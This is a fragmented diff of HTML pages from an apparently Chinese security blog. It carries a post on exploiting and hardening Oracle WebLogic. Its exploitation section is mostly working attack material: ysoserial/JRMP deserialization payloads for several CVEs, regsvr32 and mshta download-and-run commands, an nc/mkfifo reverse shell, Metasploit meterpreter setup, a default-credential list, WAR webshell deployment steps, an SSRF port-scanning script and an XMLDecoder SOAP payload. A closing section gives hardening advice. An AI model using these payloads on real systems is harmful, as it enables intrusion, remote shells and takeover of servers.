-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit-CVE-2017-3248-bobsecq.py -t 192.168.3.195 -p 7001 --jip 192.168.3.14 --jport 1099 --cmd "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysopath ysoserial.jar</span><br></pre></td></tr></table></figure>
-<p>上面执行完以后,脚本会提示你启动 JRMP 监听,此时另起一个终端执行该监听,而后再回到上面去继续敲回车执行我们的 payload<br>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 ‘regsvr32 /s /n /u /i:<a href="http://192.168.3.14:8080/y8kiz" target="_blank" rel="noopener">http://192.168.3.14:8080/y8kiz</a> ans5Oa7F.sct scrobj.dll’    起监听,等待远程连接下载执行相应的 payload    </p>
-<p>最后,便会看到目标机器的 meterpreter 正常被弹回</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kiz ans5Oa7F.sct scrobj.dll'	起监听,等待远程连接下载执行相应的 payload</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
-<h3 id="7、-代码执行-CVE-2016-3510"><a href="#7、-代码执行-CVE-2016-3510" class="headerlink" title="7、    代码执行[CVE-2016-3510]"></a>7、    代码执行[CVE-2016-3510]</h3><p>poc:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic-CVE-2016-3510.py 192.168.3.195:7001 "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysoserial-path ysoserial.jar</span><br></pre></td></tr></table></figure>
-<h3 id="8、-代码执行-CVE-2015-4852"><a href="#8、-代码执行-CVE-2015-4852" class="headerlink" title="8、    代码执行[CVE-2015-4852]"></a>8、    代码执行[CVE-2015-4852]</h3><blockquote>
-<p>受影响版本:<br>Oracle WebLogic Server, versions 10.3.6.0, 12.1.2.0, 12.1.3.0 and 12.2.1.0</p>
-</blockquote>
-<p>直接利用 t3 协议反弹目标机器的 cmd shell</p>
-<blockquote>
-<p>python weblogic.py -u 192.168.3.11 -p 7001 -os win -t reverse_shell –LHOST 192.168.3.14 –LPORT 8081    </p>
-</blockquote>
-<blockquote>
-<p>nc -lvvp 8081    </p>
-</blockquote>
-<h3 id="9、Weblogic-ssrf"><a href="#9、Weblogic-ssrf" class="headerlink" title="9、Weblogic ssrf"></a>9、Weblogic ssrf</h3><p>Weblogic ssrf url 如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.195:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">poc url: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp; txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
-<p>探测内网开放端口:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        final_ip = <span class="string">'&#123;ip&#125;.&#123;i&#125;'</span>.format(ip=ip, i=i)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'6379'</span>,<span class="string">'445'</span>,<span class="string">'8080'</span>,<span class="string">'3389'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'80'</span>,<span class="string">'443'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = args.url+<span class="string">'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print vul_url</span></span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)</span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Weblogic SSRF vulnerable exploit'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, dest=<span class="string">'url'</span>, required=<span class="keyword">True</span>, help=<span class="string">'Target url'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    ip = <span class="string">"192.168.4"</span></span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x02-安全加固"><a href="#0x02-安全加固" class="headerlink" title="0x02 安全加固"></a>0x02 安全加固</h2><p>1.1. 目的</p>
-<p>   本规范明确了Weblogic应用服务器安全配置方面的基本要求。为了提高Weblogic应用服务器的安全性而提出的。<br>1.2. 范围<br>   本规范适用于XXXX使用的Weblogic应用服务器。<br>\2. 强化Weblogic主机<br>2.1. 强化操作系统网络服务<br>【说明】在安装Weblogic前加固底层的操作系统。<br>2.2. 使用可以防止非授权访问的文件系统<br>【说明】确保Weblogic主机的文件系统可以防止非授权访问，例如Windows的NTFS。<br>2.3. 限制Weblogic主机上的用户数量<br>【说明】理想状况下，主机上的帐号应为2个管理员权限的帐号，1个运行Weblogic的帐号。<br>2.4. 帐号和密码<br>【说明】避免使用明显可以猜测到的帐号如”system”,”admin”或者”administrator”。口令至少8位，并满足复杂度要求。<br>2.5. 访问Weblogic资源的帐号的唯一性<br>【说明】在操作系统上建立一个专门用于Weblogic的帐号。<br>【具体配置】<br>该帐号只能操作以下三个目录：<br>1)BEA主目录。该目录是BEA多个产品的共享目录。<br>2)Weblogic安装目录。该目录包括了所有的安装程序。<br>3)域目录。该目录包括了设置文件、安全文件、日志文件和J2EE应用等。<br>赋予该帐号对以上三个目录读写执行权限。<br>2.6. 使用特殊帐号Run Weblogic Server Windows服务<br>【说明】在Windows平台，可以以Windows服务的方式运行Weblogic Server实例。这样会导致每次启动Windows自动执行Weblogic Server。而且不要以Windows administrator权限运行Weblogic Server。<br>【具体配置】<br>如何以一个特殊非管理员帐号运行Weblogic Server请参考以下：  </p>
-<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service</a></p>
-<p>验证以一个特殊非管理员帐号运行Weblogic Server请参考以下：</p>
-<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService</a><br>2.7. 不在生产机上开发<br>【说明】在开发环境中开发相应的代码，经过测试后将代码转移到生产机上。此举是为了防止开发过程中的Bug影响生产环境。<br>【具体配置】  验证DocumentRoot包括以下设置：  </p>
-<p>Order allow,deny Allow from all<br>Options None<br>AllowOverride None<br>​<br>2.8. 不在生产机上安装开发和sample软件<br>【说明】将开发工具从生产机上移除可以防止该工具被入侵者利用，一定程度地访问生产系统。<br>2.9. 启动安全审计<br>【说明】如果Weblogic运行的操作系统支持对文件和目录访问的安全审计，建议使用日志跟踪对文件和目录的拒绝访问。<br>【具体配置】<br>使用ModSecurity Core Rules限制请求的方式： </p>
-<p>modsecurity_crs_30_http_policy.conf 文件包括以下的规则，</p>
-<p># allow request methods</p>
-<p>#</p>
-<p># TODO Most applications only use GET, HEAD, and POST request</p>
-<p># methods, if so uncomment the line below. Otherwise you are advised </p>
-<p># to edit the line before uncommenting it.</p>
-<p>#  </p>
-<p>SecRule REQUEST_METHOD “!^((?:(?:POS|GE)T|OPTIONS|HEAD))$” \<br>“phase:1,log,auditlog,status:501,msg:’Method is not allowed by policy’, severity:’2’,,id:’960032’,”<br>2.10. 应用最新的BEA补丁，考虑实施官方最新的安全建议<br>【说明】如题<br>【具体配置】<br>注册BEA Advisories &amp; Notifications（<a href="http://dev2dev.bea.com/advisories" target="_blank" rel="noopener">http://dev2dev.bea.com/advisories</a>）以便收到最新的安全建议信息。  </p>
-<p>从<a href="http://commerce.beasys.com/downloads" target="_blank" rel="noopener">http://commerce.beasys.com/downloads</a>.可以下载Service Pack<br>\3. 强化网络连接<br>3.1. 使用防火墙或Weblogic Server connection filters<br>【说明】建议使用防火墙限制Weblogic Server域外到域的连接；使用Connection Filters限制Weblogic Server域内的连接。更多信息可参考<br><a href="http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter</a><br>3.2. 使用管理端口来承载管理的流量 </p>
-<p>【说明】建议使用域范围内的管理端口 Administration Port来限制同一Weblogic Server域内的server instances间的流量都经过同一端口。当不使用管理端口时，管理流量会以明文形式在网上传输。管理端口另一个好处是当遭受到拒绝服务攻击时，仍然可以通过该端口管理Weblogic Server。</p>
-<p>配合Connection Filters使用，可以指定Weblogic Server只接受来自某一IP段的管理请求，并所有连接只通过一个端口。</p>
-<p>使用管理端口可以保证客户端与管理控制台以加密的方式连接。 更多信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling</a><br>3.3. 使用管理通道 </p>
-<p>【说明】建议启用管理通道Administration Channel以确保服务器间的管理流量的安全性。没有管理通道，一些关键的管理信息会以明文传输。更多的信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/admin_domain/network.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/admin_domain/network.html</a></p>
-<p>\4. 强化Weblogic安全服务<br>4.1. 部署符合生产环境的Security Provider<br>【说明】Weblogic Security Service使用了一个可插拔的安全架构，在这个架构下可以部署多个secuirty provider。缺省条件下，Weblogic Server包括其自身的security providers,该provider已经提供了完整的安全解决方案。<br>【具体配置】<br>确保恰当地部署了security providers.<br>可以通过以下位置验证：</p>
-<p>Administration Console under the Security → Realms → RealmName→<br>Providers folder. </p>
-<p>其它信息可以参考：<a href="http://e-docs.bea.com/wls/docs70/secmanage/realm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/realm.html</a><br>4.2. 使用SSL<br>【说明】为保证数据传输安全，建议使用SSL和HTTPS替代HTTP。Weblogic Server包括一系列的开发用的Private Keys，数字证书和truseted certificate authorities。每一个下载Weblogic Server的用户都拥有对这些证书的Private Keys。禁止使用展示用的identity &amp; trust.<br>设置SSL可以参考<a href="http://e-docs.bea.com/wls/docs70/secmanage/ssl.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/ssl.html</a><br>4.3. 使用主机名验证<br>【说明】使用主机名验证以避免中间人攻击。缺省下，Weblogic SSL验证发起连接的主机是否经过授权，但实施SSL前主机名验证可能已经被禁止了。 </p>
-<p>【具体配置】<br>确保使用了Hostname 可以通过以下位置设置：<br> Administration Console on theServer s→ ServerName → Connections → SSL<br>tab.<br>4.4. 防止拒绝服务<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Servers →<br>ServerName →Connections → Protocols tab.<br>4.5. 设置帐号锁定和登录时间<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → User Lockouts tab.<br>4.6. 开启安全审计<br>【说明】如果开启了Weblogic Security Service提供的Auditing Provider，日志会存在以下位置：DomainName\DefaultAuditRecorder.log<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → Providers → Auditors page. 更多信息可以参考：<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider</a><br>4.7. 限制发送主机名和版本号<br>【说明】缺省条件下，当Weblogic Server响应HTTP请求时，在其HTTP响应的包头中包括服务器的名称和Weblogic版本号，这会导致服务器信息的泄漏。 </p>
-<p>可以通过以下位置设置： </p>
-<p> disable the Send Server Header Enabled attribute in the Administration Console. The attribute is located on the Server →ServerName → Connections → HTTP tab.<br>4.8. 默认安全角色<br>【说明】确保正确地将用户和组分配给默认的Weblogic Server Security roles. 缺省下，Weblogic是基于一系列的缺省安全角色和安全策略来保护资源。更多信息可以参考：</p>
-<p><a href="http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/中间件安全/">中间件安全</a></li></ul>
 
     </footer>
   </div>
@@ -1582,6 +1442,146 @@
 <!-- Table of Contents -->
 
   
+    <article id="post-中间件安全-Weblogic漏洞利用与安全加固"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/">Weblogic漏洞利用与安全加固</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/" class="article-date">
+	  <time datetime="2018-01-13T15:53:56.000Z" itemprop="datePublished">2018-01-13</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>  WebLogic是美国bea公司出品的一个application server，确切的说是一个基于Javaee架构的中间件，纯java开发的，最新版本WebLogic Server 12cR2 (12.2.1.3)(截至发文前)是迄今为止发布的最卓越的BEA应用服务器。BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。完全遵循J2EE 1.4规范。</p>
+<p>安装：<a href="https://blog.csdn.net/acmman/article/details/70093877" target="_blank" rel="noopener">https://blog.csdn.net/acmman/article/details/70093877</a></p>
+<h2 id="0x01漏洞利用"><a href="#0x01漏洞利用" class="headerlink" title="0x01漏洞利用"></a>0x01漏洞利用</h2><h3 id="1、-默认管理控制台入口"><a href="#1、-默认管理控制台入口" class="headerlink" title="1、    默认管理控制台入口,"></a>1、    默认管理控制台入口,</h3><p>端口扫描 + web 搜索引擎 + 空间搜索引擎</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -Pn -v --open -p 80,7000-10000 192.168.3.195	考虑到精度,建议直接在目标 C 段跑,weblogic 默认端口为 7001,但通常情况下都会被目标管理员改掉,所以实战中端口最好稍微放大点</span><br></pre></td></tr></table></figure>
+<p>如何精确识别 weblogic 版本是否在漏洞范围内,其实在控制台入口页面的左下角就有详细显示</p>
+<h3 id="2、部署War包传Webshell"><a href="#2、部署War包传Webshell" class="headerlink" title="2、部署War包传Webshell"></a>2、部署War包传Webshell</h3><p>1)    常见 weblogic 入口弱口令列表如下,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">administrator:password </span><br><span class="line">weblogic:password </span><br><span class="line">weblogic:weblogic </span><br><span class="line">weblogic:weblogic1 </span><br><span class="line">weblogic:welcome1 </span><br><span class="line">weblogic:Oracle@123 </span><br><span class="line">system:weblogic </span><br><span class="line">system:password </span><br><span class="line">system:security </span><br><span class="line">system:system </span><br><span class="line">portaladmin:portaladmin</span><br><span class="line">wlcsystem:wlcsystem </span><br><span class="line">wlpisystem:wlpisystem </span><br><span class="line">admin:security</span><br><span class="line">joe:password</span><br><span class="line">guest:guest</span><br></pre></td></tr></table></figure>
+<p>2)    当我们登录成功后,就可以立即尝试部署自己的 war 包 webshell 了,以下方法对于 weblogic 10.x - 12.x 版本几乎通用,具体如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">首先,登到 weblogic 控制台中,点击&apos; 锁定并编辑&apos; -&gt; &apos; 部署&apos;</span><br><span class="line"></span><br><span class="line">选择 &apos;安装&apos;</span><br><span class="line"></span><br><span class="line">选中自己事先准备好的 war 包 webshell [ 依然还是用我们之前文章中的那个 war 包 ],选择第一项 &apos;将部署上载到管理服务器&apos;,然后点击下一步</span><br><span class="line"></span><br><span class="line">根据提示可以看到, 此时我们的 war 包已经上传成功了,就在如下的目录中,继续...</span><br><span class="line"></span><br><span class="line">给该部署命名,此处为了防止出问题,建议保持默认</span><br><span class="line"></span><br><span class="line">点击&apos; 完成&apos;后,会提示 &apos;设置更新成功&apos;</span><br><span class="line"></span><br><span class="line">此时再次回到&apos;部署&apos;选项中,选中刚刚部署的 cmd 应用程序,点击&apos;启动&apos;服务,注意,此处一定要来自己手工启动服务,不然 shell 是部署不上的</span><br><span class="line"></span><br><span class="line">选择&apos; 是&apos;</span><br></pre></td></tr></table></figure>
+<p>看到上面提示已启动部署,此时再用浏览器访问 http://[本地IP]:7001/cmd/cmd.jsp 就可以看到我们的 shell 了,如下</p>
+<h3 id="3、-Weblogic远程代码执行漏洞-CVE-2018-2893"><a href="#3、-Weblogic远程代码执行漏洞-CVE-2018-2893" class="headerlink" title="3、   Weblogic远程代码执行漏洞[CVE-2018-2893]"></a>3、   Weblogic远程代码执行漏洞[CVE-2018-2893]</h3><p><strong><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></strong></p>
+<blockquote>
+<ul>
+<li>Weblogic 10.3.6.0</li>
+<li>Weblogic 12.1.3.0</li>
+<li>Weblogic 12.2.1.2</li>
+<li>Weblogic 12.2.1.3</li>
+</ul>
+</blockquote>
+<p>漏洞验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2018-2893-test.py [目标IP] 7001</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-cve-2018-2893.jar JRMPClient4 &quot;[本地IP]:1099&quot; &gt; shell.cer</span><br><span class="line">java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;mshta.exe [本地IP] /options.hta&quot;</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic.py [目标IP] 7001 shell.cer	在远程目标机器上执行该 payload</span><br></pre></td></tr></table></figure>
+<h3 id="4、反序列化远程代码执行-CVE-2018-2628"><a href="#4、反序列化远程代码执行-CVE-2018-2628" class="headerlink" title="4、反序列化远程代码执行 [CVE-2018-2628]"></a>4、反序列化远程代码执行 [CVE-2018-2628]</h3><p>基本原理：由于 weblogic 对于 T3 协议发送的数据包没有过滤,注册一个 RMI 接口,通过 T3 协议建立连接,加载回来再一步步解包,利用 readObject 解析,从而造成了反序列化远程代码执行 </p>
+<blockquote>
+<p>影 响 版 本 :</p>
+<p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p>
+</blockquote>
+<p><strong>漏洞验证</strong></p>
+<p>依然是先快速验证下目标是否存在此漏洞 [ 注意,目标如果用的是非默认的 7001 端口,则需要自行到脚本中去稍微改下 ]:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ' regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll'</span><br><span class="line"><span class="meta">#</span>win 平台反弹 meterpreter</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.233 110 &gt;/tmp/f'</span><br><span class="line"><span class="meta">#</span>linux反弹bash</span><br></pre></td></tr></table></figure>
+<p>看到会话回来此处就可以立即 ctrl + c 了,很显然,既然可以弹 meterpreter,那也就一定可以弹 beacon。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628-exploit.py [目标IP] 7001 ysoserial.jar 192.168.3.14 1099 JRMPClient</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit –j</span><br><span class="line">msf &gt; sessions -i 1</span><br><span class="line">meterpreter &gt; sysinfo meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+<h3 id="5、反序列化-CVE-2017-10271"><a href="#5、反序列化-CVE-2017-10271" class="headerlink" title="5、反序列化[CVE-2017-10271]"></a>5、反序列化[CVE-2017-10271]</h3><p>漏洞基本原理：即 wls wsat 模块的 RCE,究其底层其实还是 XMLDecoder 的反序列化漏洞 </p>
+<p><strong>poc</strong>：<a href="https://github.com/hanc00l/weblogic_wls_wsat_rce" target="_blank" rel="noopener">https://github.com/hanc00l/weblogic_wls_wsat_rce</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic_wls_wsat_exp.py -t 172.16.80.131:7001</span><br></pre></td></tr></table></figure>
+<p><strong>poc</strong>：</p>
+<p><a href="http://www.bugsafe.cn/archives/136.html" target="_blank" rel="noopener">http://www.bugsafe.cn/archives/136.html</a></p>
+<p>首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞<br>http://[目标IP] /wls-wsat/CoordinatorPortType    </p>
+<p><img src="http://ps3bnv59u.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
+<p>而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.3.195</span><br><span class="line">Accept-Encoding: identity Content-Length: 695</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</span><br><span class="line">Connection: keep-alive Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;cmd.exe&lt;/string&gt; #于执行 payload 代码的命令解释器,如果是在 linux 中,此处通常应该为/bin/bash</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt; #不交互,在 linux 下的选项写法为-c</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void 